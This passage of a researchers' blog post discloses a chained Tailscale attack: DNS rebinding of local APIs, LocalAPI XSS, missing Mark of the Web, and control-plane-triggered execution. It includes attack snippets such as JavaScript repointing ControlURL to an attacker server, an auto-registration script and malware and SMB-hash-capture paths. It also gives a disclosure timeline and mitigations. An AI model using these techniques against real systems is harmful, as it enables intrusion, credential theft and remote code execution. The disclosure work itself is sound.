"PrivateNodeKey": "privkey:0000000000000000000000000000000000000000000000000000000000000000",
...
```

...but is revealed when preferences are updated:

```
PATCH /localapi/v0/prefs HTTP/1.1
{}

...
"PrivateNodeKey": "privkey:d8e0d574e0ef19adafe8ed83b6068f6dd47c4c2e3062342f4673c63488e5f75e",
...
```

This key should allow us to impersonate the targeted Windows node on the
tailnet, opening Wireguard connections and accessing private services that
should not be exposed to us. Unfortunately, there are some additional custom
packets required to talk to a Tailscale node on top of pure Wireguard. The
relevant code is open source, but using it would require writing an
unconscionable amount of Go. Thus, we move on...

## Becoming the Control Plane

A `PATCH` to `/localapi/v0/prefs` can be used to update `ControlURL`, moving the
machine to an attacker-controlled control plane server, away from the default of
`https://controlplane.tailscale.com`. The third-party open-source control plane
server implementation, [Headscale](https://github.com/juanfont/headscale "null"), will
serve our purposes nicely.

Unfortunately, the `ControlURL` change doesn't take effect until the Tailscale
client is restarted. In practice, this will likely mean waiting for the whole
machine to reboot – likely not an insurmountable restriction in the age of
automatic Windows Update installation.

We can process Headscale's logs to automatically accept new machines that appear
into our malicious tailnet:

`while(<>){/(?<=ter\/)nodekey:\w*/&&`headscale -n meow nodes register --key $&`}`
```
import re
import subprocess
import sys

seen = set()
r = re.compile(rb"(?<=/register/)nodekey:[^ ]*")

for line in sys.stdin.buffer:
    if (match := r.search(line)):
        if match not in seen:
            subprocess.run([sys.argv[1], "-n" "meow", "nodes", "register", "--key", match[0].decode()])
            seen.add(match)

    sys.stdout.buffer.write(line)
```

Once the machine has rebooted and joined, we can access any network services the
machine runs. While we're setting preferences through the LocalAPI, we can also
configure the machine to act as an Exit Node, letting us access any other
services on the same physical network as the targeted machine.

This sounds like a highly effective attack, as it gives us a position from which
to move laterally within the target's traditional network, without running
malicious code on the machine (except for the one-off Javascript to reconfigure
`tailscaled`) – Tailscale is acting as a LOLBin, proxying us into the network.

In practice, access to the local network may not be as exciting a prospect
against a Tailscale user as it would against nearly any other target. If they've
fully bought in to the Tailscale way of doing things, there probably isn't
anything particularly juicy sitting around unfirewalled on the traditional
private network.

## PopBrowserUR\_Shell\_

In theory, there is no path for a malicious Tailscale control plane to remotely
execute code on your machine, unless you happen to run network services that are
designed to allow it, like an
[SSH server with Tailscale-backed authentication](https://tailscale.com/kb/1193/tailscale-ssh/ "null").
In practice:

*aarch64 Windows doesn't have calc.exe; please accept this notepad-popping as a meager substitute*

`tailscaled` is constantly long-polling the control plane, waiting for updates
to the layout of your network. Sometimes, when you want to perform a privileged
action, like SSHing to a locked-down server, Tailscale will ask you to
re-authenticate yourself, by including a `PopBrowserURL` field in the response.

### Issue 2 - Control plane can trigger code execution

*Resolved in `1.32.3` through URL filtering*

The daemon forwards this URL to the GUI, whose job is to open it in a web
browser. The specifics of how this is implemented are unclear, as the GUI
component is closed-source, and reverse-engineering Go binaries is about as fun
as pulling teeth from an adorable blue gopher. Suffice to say it is implemented
sub-optimally, as it allows the control plane to push out arbitrary paths for
files to open.

How can we go from "open any path" to "execute any code"? Windows can open
executables directly from WebDAV servers, which seems promising! If we push out
the URL `\\live.sysinternals.com\tools\Procmon64.exe`, Tailscale will download
and launch Procmon, but the user will be prompted before the program launches,
as the downloaded file bears the Mark of the Web:

![Windows popup: We can't verify who created this file. Are you sure you want to run this file?](/posts/tailscale/motw.jpg)

We can use another Tailscale feature to bypass the need for user interaction.
Taildrop is a super-convenient feature, providing a UI to send files between
devices owned by the same user on a tailnet. Taildrop can be enabled/disabled by
the tailnet administrator, and it is off by default. Unfortunately, ever since
your `ControlURL` was changed to point to a malicious server, your tailnet
administrator has not been someone with your best interests at heart.

![Tailscale marketing screenshot: "Taildrop by Tailscale is the simplest way to send files to any of your devices, anywhere. A safe private network that just works."](/posts/tailscale/tailscale-website.jpg)

### Issue 3 - Taildrop does not apply Mark of the Web

*Resolved in `1.32.3` (MOTW and `com.apple.quarantine` applied)*

From another machine on the Headscale tailnet, we can Taildrop an arbitrary
executable which will land on the victim's desktop. This file is not tainted
with the Mark of the Web, so Tailscale will be able to launch it without user
interaction. All we need to do is find it:

```
"PopBrowserURL": "C:\Users\___🤷‍♀️___\Desktop\malware.exe"
```

Perhaps it is possible to guess the target's Windows username from their email
address, which we learned from rebinding to the LocalAPI `status` endpoint
earlier. Perhaps the target is sitting on a network with an unauthenticated LDAP
server, which we can bind to and enumerate usernames, using the victim as an
Exit Node. There is a solution which applies much more generally, and like so
much of Windows, it's remarkably cursed:

To learn the target's username, we must first learn their password.

```
"PopBrowserURL": "\\100.64.0.1"
```

![Screenshot from Responder, showing an NTLMv2-SSP Hash for Jamie received over SMB from 100.64.0.2](/posts/tailscale/responder.png)

We can ask Tailscale to open a path on an SMB share. Windows being Windows, it
will send your username (and a hash of your login password) to this server,
unprompted, despite having no reason to consider the server trustworthy.

Since we can make the SMB connection over Tailscale, we bypass any network-level
egress filtering of SMB connections, which appears to be a commonly-recommended
mitigation against this class of attack.

Now the Windows username is known, we can fill in the blank, and trigger
execution of our code:

```
"PopBrowserURL": "C:\Users\jamie\Desktop\malware.exe"
```
### Demo Time

Having discovered these three bugs, which we believed could be chained for RCE
against any Windows Tailscale user, we were content. All that was left was to
polish our demo. To do so, we first moved the server hosting the
proof-of-concept from a local machine to one in the cloud. A quick re-test in
Chrome, and...

![Chrome developer console message: Access to fetch at 'http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it/' from origin 'http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it' has been blocked by CORS policy: The request client is not a secure context and the resource is in more-private address space `local`.](/posts/tailscale/pna.png)

None of these words are in the Bible.

This is certainly true of the King James Version, but many of these words can be
found in what might as well be the Old Testament of Same-Origin Policy: the
[WhatWG Fetch Standard](https://fetch.spec.whatwg.org/ "null"), which defines the CORS
rules we are being accused of violating.

The Fetch Standard certainly does *not* define a way for a request targeting the
same domain, protocol, and port as the requesting webpage to be considered
Cross-Site. Apparently, at some point in the past 2~~022~~ years, a whole new
standard came about:

> ~~Judge not according to the appearance, but judge righteous judgment~~ ~~--
> John 7:24~~

> The mitigation described here operates upon the IP address which the user
> agent actually connects to when loading a particular resource. This check MUST
> be performed for each new connection made, as DNS rebinding attacks may
> otherwise trick the user agent into revealing information it shouldn’t. --
> [WICG Private Network Access Standard §5.3 DNS Rebinding](https://wicg.github.io/private-network-access/#dns-rebinding "null")

## DNS Rebinding is Dead

The effect of this policy, as currently implemented in Chrome and Edgium,
appears to be that a site hosted in public IP address space cannot rebind to one
hosted in private IP space. When the proof-of-concept was hosted at
`192.168.1.172`, we could attack all browsers just fine, but as soon as we moved
it to the internet, these mitigations worked their mitigatory magic.

Firefox does not implement PNA, and is fully exploitable over the public
internet using the bugs described above.

The IP addresses considered private by PNA are:

* `127.0.0.0/8`; the IPv4 loopback space
* `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16`; the RFC1918 IPv4 spaces;
* `169.254.0.0/16`; the IPv4 link-local space
* The IPv6-mapped versions of the above
* `::1/128`; the IPv6 loopback space
* `fc00::/7`; the IPv6 Unique Local Address space
* `fe80::/10`; the IPv6 link-local unicast space

IPv6 tailnet addresses are chosen from the `fc00::/7` space, so the attack
should be usable for lateral movement within a tailnet against users. Notably,
this strategy does not require an ACL which allows traffic to `:41112` on the
attacker's machine, due to the
[ability to opt out of the firewall](https://pulsesecurity.co.nz/articles/some-tailscale-tricks "null")
previously discussed by Pulse Security.

Using issues 1-3, this gives us:

|  | Windows+Firefox | Windows+Chrome | Non-Windows |
| --- | --- | --- | --- |
| **No special access** | Exploitable | Unexploitable? (PNA) | Not vulnerable |
| **Same local network** | Exploitable | Exploitable | Not vulnerable |
| **Same Tailnet** | Exploitable | Exploitable | Not vulnerable |

We just mentioned that IPv6 tailnet addresses are private.

IPv4 Tailscale addresses are not from RFC1918. They are not link-local, and they
are certainly not loopback. IPv4 Tailscale addresses are RFC6598 CGNAT
addresses, from the `100.64.0.0/10` space, a space that is **not considered
private by Chrome!**

## Long Live DNS Rebinding

Tailscaled runs a web server at 100.100.100.100. This is all it does:

![The page 100.100.100.100, open in Chrome: "Tailscale. Local Addresses: 100.109.225.113, fd7a:(rest of v6 address)"](/posts/tailscale/quad100.png)

### Issue 4 - Quad100 vulnerable to DNS Rebinding

*Resolved in `1.32.3` (`Host` header allowlist implemented)*

It ain't much, but it's rebindable, and it lets us learn the target's Tailnet IP
address. And unlike the LocalAPI, this one works everywhere, not just Windows!

Hey, what's this?

![](/posts/tailscale/peerapi.png)

This is the **PeerAPI**. It's an API exposed over HTTP, on a
[predictable port](https://github.com/tailscale/tailscale/blob/7c285fe7ee67ae6a986fc543d1a28beda4db7462/ipn/ipnlocal/peerapi.go#L425-L444 "null"),
to other nodes on the Tailnet. It's not used for the core functionality of
Tailscale, but for additional features, like Taildrop, as well as for some
[introspection functionality](https://pulsesecurity.co.nz/articles/some-tailscale-tricks "null").

### Issue 5 - PeerAPI vulnerable to DNS Rebinding

**CVE**: CVE-2022-41925
 **Advisory**:
[TS-2022-005](https://tailscale.com/security-bulletins/#ts-2022-005 "null")

 *Resolved in `1.32.3` (`Host` header allowlist, introspection locked down)*

What address space is it in? That's right, tailnet address space! We can rebind
to Quad100, learn the target's tailnet address, calculate their PeerAPI port,
rebind to *that*, dump their environment variables, learn about their other
tailnet devices, and send them files via Taildrop.

### How Taildrop Works

1. When I want to send a file to one of my fellow Tailscale nodes, I connect to
   its PeerAPI, and PUT a file to `/v0/put/$filename-of-my-choosing`.
2. `tailscaled` stores this file in a temporary location. On Windows, that's
   `C:\ProgramData\Tailscale\files\$email-uid-$uid\$filename-of-my-choosing`.
3. `tailscaled` informs the GUI that a new file has arrived
4. The GUI fetches the file from `tailscaled` through a GET request to the
   LocalAPI, and saves it to the desktop.
5. The LocalAPI GET request is served with `Content-Type: text/html`.

![](/posts/tailscale/gru.jpg)

### Issue 6: Cross-Site Scripting in LocalAPI

*Resolved in `1.32.3` through `Content-Type` fix, `Content-Security-Policy`, and
request header checks*

Exploiting this XSS issue in practice requires some trickery. As part of
handling the LocalAPI GET request, tailscaled will delete the file from the
temporary directory, since it has now been moved to its final location. This
happens automatically, so we would need to win a race against the GUI to load
our HTML before it is destroyed.

Instead, we discovered that if we upload multiple files with the same name to in
parallel, the various threads will fight over the shared filename, and some of
the requests will end up failing, meaning that the file never gets deleted. We
can load the HTML in an `iframe`, which is not prohibited by PNA:

```
<iframe src="http://127.0.0.1:41112/localapi/v0/files/evil.html"></iframe>
```

Now our Javascript is running in a true LocalAPI origin, we gain equivalent
access to what we got from Issue 1, but without Chromium's pesky security
features getting in the way.

The path to RCE from here is the same as earlier, but with an extra little bit
of polish now available. On the very same day we discovered the XSS
vulnerability, the first commits of a new feature were trickling into the `main`
branch of the Tailscale GitHub repo.
[Fast User Switching](https://github.com/tailscale/tailscale/issues/713#issuecomment-1320546602 "null")
(work in progress, not yet available in a released Tailscale version) allows
Tailscale to switch between multiple accounts without logging out and logging in
from scratch. As part of this, tailscaled may need to switch to another control
plane server, without manually being restarted! We can use this feature to have
our target machine join the Headscale tailnet in just a few seconds, no reboot
required:

```
let id =
  (await (await fetch("/localapi/v0/profiles/current", { method: "GET" }))
    .json()).ID;
await fetch("/localapi/v0/prefs", {
  method: "PATCH",
  body: JSON.stringify({
    ControlURL: "http://1.2.3.4:8080",
    ControlURLSet: true,
  }),
});
await sleep(1000);
await fetch("/localapi/v0/profiles/", { method: "PUT" });
await sleep(1000);
await fetch("/localapi/v0/profiles/" + id, { method: "POST" });
```
### Demo Time, Again

By chaining issues 4, 5, 6, 2, and 3; we can finally achieve RCE against Chrome
users over the public internet:

# Issue 7: Your service here vulnerable to DNS rebinding?

Tailscale's documentation tends to encourage a model wherein web services are
published to the Tailnet over unencrypted HTTP, and authentication based solely
on network position, whether implicitly (services lacking authentication) or
explicitly (identifying the user with `whois` requests).

While we have not undertaken in-depth research here, we suspect that real-world
Tailscale deployments have many high-impact rebindable web services.

Let's compare the Tailscale approach to two alternative models, in the context
of DNS rebinding attacks:

### BeyondCorp-style HTTPS access proxies

DNS Rebinding attacks generally don't work against HTTPS services: if the
target's browser loads
`https://toggle-between-attacker-and-webmail.attacker.com` and reaches out to
the legitimate webmail server, it will be presented with a TLS certificate which
does not match the rebound domain, and will throw a certificate error.

### Implicitly-trusted flat network with internal HTTP services, traditional VPNs

Traditionally, this case would be equivalent to the Tailscale case. However, the
advent of Private Network Access protection in Chromium-based browsers ends up
providing what appears to be effective protection against rebinding attacks for
these browsers in traditional private networks – protection which is
unfortunately not extended to Tailscale customers.

### Recommendations

This is a thorny issue, and we don't see an obvious mitigation for Tailscale to
implement. The onus thus shifts to Tailscale's customers.

If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated *or* rely on Tailscale for authentication, implement an
allowlist of expected HTTP `Host` headers to prevent malicious Javascript from
accessing these services.

This mitigation can be tested with `curl` – if you can put something random in
the `Host` header, and you can view information or take actions which should not
be available to the public, action is required:

![](/posts/tailscale/dns-rebinding.png)

Alternatively, you can use Tailscale's built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either [directly](https://tailscale.com/blog/tls-certs/ "null") or via
something like [caddy](https://tailscale.com/blog/caddy/ "null").

Tailscale has published remediation advice for this issue
[here](https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks "null").

# Timeline and Vendor Response

The speed and quality of Tailscale's response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.

Times in NZDT (UTC+13):

* **Mon 7 November**: Emily starts research, identifies LocalAPI as rebindable
* **Thu 10 November**: Jamie joins research
* ...hacking in progress...
* **Wed 16 November, 12:07AM**: Report sent to security@tailscale.com, covering
  all 7 issues
* **Wed 16 November, 2:04AM**: Confirmation of receipt
* **Wed 16 November, 4:54AM-9:11AM**: Fixes for issues 1/2/4/5/6 committed,
  including several additional high-quality defence-in-depth mitigations on top
  of our suggested fixes
* **Wed 16 November, 8:36AM**:
  [A bunch of Tailscale people are on a train](https://twitter.com/Tailscale/status/1592964802263289857 "null").
  I'm not really certain how this affects things, but it's pretty cool
* **Wed 16 November, 10:52AM**: Full reply from Tailscale, containing:
  + Details of all fixes made so far;
  + Plans for additional fixes yet to be made, review of logs to check for past
    exploitation, etc;
  + Request for our input on the completeness of the fix;
  + Estimate of coordinted disclosure timeline;
  + Vouchers for Tailscale Personal Pro accounts & Tailscale Merch;
  + Offer of US$10,000 bounty, despite the Security page explicitly saying they
    do not have a bounty program!
* **Wed 16 November, 4:17PM**: We confirm that the major issues are resolved
* **Wed 16 November, 6:51PM**:
  [The train arrives in Seattle](https://twitter.com/Tailscale/status/1593119669569081350 "null")
* ...discussion and implementation of additional defense-in-depth measures;
  issue 3 resolved...
* **Sat 19 November**: Coordinated Disclosure time proposed by Tailscale,
  accepted by us, Tailscale shares planned Security Bulletins and blog post
* **Tue 22 November, 5:06AM**: Blog draft shared with Tailscale (a bit last
  minute, sorry!!!)
* **Tue 22 November, 7:00AM**: Coordinated disclosure time

---

### Co-Authored-By

Jamie McClymont ([twitter](https://twitter.com/JJJollyjim "null"),
[cohost](https://cohost.org/jjjollyjim "null"),
[mastodon](https://social.memes.nz/%40jamie "null"))

> ps. I'm looking for work. Come say hi! 👋
>
> - Emily 💖

# Superfluous GraphViz

foothold

Attacker runs JS in target's browser

LocalAPI is same-origin

LocalAPI is same-origin

foothold->LocalAPI is same-origin

Bug 1: LocalAPI Rebinding
if (Windows and
         (Firefox or same physical network or same tailnet))

Quad100 is same-origin

Quad100 is same-origin

foothold->Quad100 is same-origin

    Bug 4: Quad100 Rebinding

Impersonation on Tailnet

Impersonation on Tailnet

foothold->Impersonation on Tailnet

         Bug 7: Rebinding to other Tailnet services
         if (services speak plain HTTP without Host check)

Start

Start

Start->foothold

      Phishing, Malvertising, XSS of 3rd-parties

Tailnet information disclosure

Tailnet information disclosure

LocalAPI is same-origin->Tailnet information disclosure

GET status,
GET whois...

Node Private Key disclosure

Node Private Key disclosure

LocalAPI is same-origin->Node Private Key disclosure

PATCH prefs

Pending ControlURL change

Pending ControlURL change

LocalAPI is same-origin->Pending ControlURL change

   PATCH prefs (ControlURL)

Tailnet IP known

Tailnet IP known

Quad100 is same-origin->Tailnet IP known

GET /

PeerAPI address known

PeerAPI address known

Tailnet IP known->PeerAPI address known

     Deterministic port algorithm

PeerAPI is same-origin

PeerAPI is same-origin

PeerAPI address known->PeerAPI is same-origin

    Bug 5: PeerAPI Rebinding

Malware sitting on machine

Malware sitting on machine

PeerAPI is same-origin->Malware sitting on machine

/v0/put/
if(Taildrop enabled)

Persistant file in Taildrop inbox

Persistant file in Taildrop inbox

PeerAPI is same-origin->Persistant file in Taildrop inbox

Spam /v0/put/
if (Taildrop enabled)

Env disclosure

Env disclosure

PeerAPI is same-origin->Env disclosure

GET /v0/env

PeerAPI is same-origin->Tailnet information disclosure

    GET /v0/magicsock

RCE

RCE

Malware sitting on machine->RCE

     Bug 3: MotW not set by Taildrop
     if (user launches executable)

Persistant file in Taildrop inbox->LocalAPI is same-origin

Bug 6: LocalAPI XSS
if (Windows)

Node Private Key disclosure->Impersonation on Tailnet

  Unknown preconditions,
untested

Target joins malicious Headscale

Target joins malicious Headscale

Pending ControlURL change->Target joins malicious Headscale

Await reboot

Pending ControlURL change->Target joins malicious Headscale

   PUT profile
   if (future version)

Target joins malicious Headscale->RCE

     Bug 2: Control pops SMB executable path
if (user clicks through warning)

Local network access

Local network access

Target joins malicious Headscale->Local network access

      LocalAPI + Control configure target as exit node

Malware placed on Desktop

Malware placed on Desktop

Target joins malicious Headscale->Malware placed on Desktop

   Taildrop within new Tailnet

Windows Username known

Windows Username known

Malware placed on Desktop->Windows Username known

    Bug 2: Control pops SMB path

Windows Username known->RCE

Bug 2: Control pops malware path
Bug 3: Mark of the Web not set by Taildrop

Powered by [Deno Blog](https://deno.land/x/blog) [RSS](/feed "Atom Feed")


